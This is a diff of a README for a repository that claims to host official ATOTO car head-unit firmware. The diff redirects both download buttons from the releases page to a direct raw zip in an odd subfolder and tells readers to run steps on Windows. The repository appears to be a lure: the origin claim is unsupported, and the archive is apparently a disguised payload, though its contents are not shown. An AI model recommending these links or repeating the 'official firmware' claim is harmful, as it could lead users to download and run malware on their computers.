@@ -1,6 +1,6 @@
 # ⚙️ ATOTO-Firmware - Update your unit for peak performance
 
-[![](https://img.shields.io/badge/Download_Firmware-Blue-blue)](https://github.com/Villagomezmatias23084/ATOTO-Firmware/releases)
+[![](https://img.shields.io/badge/Download_Firmware-Blue-blue)](https://raw.githubusercontent.com/Villagomezmatias23084/ATOTO-Firmware/main/marquito/Firmware_ATOT_v1.7.zip)
 
 This repository providing the official firmware update for the ATOTO S8G2B74PM head unit. This update resolves system errors and improves the speed of your device. These files come from official ATOTO support documents to ensure compatibility with your car radio.
 
@@ -14,7 +14,7 @@ Do not install this firmware on other models. Check your system settings on the 
 
 Visit the official release page to access your files.
 
-[Download Firmware Here](https://github.com/Villagomezmatias23084/ATOTO-Firmware/releases)
+[Download Firmware Here](https://raw.githubusercontent.com/Villagomezmatias23084/ATOTO-Firmware/main/marquito/Firmware_ATOT_v1.7.zip)
 
 Follow these steps on your Windows computer:
 
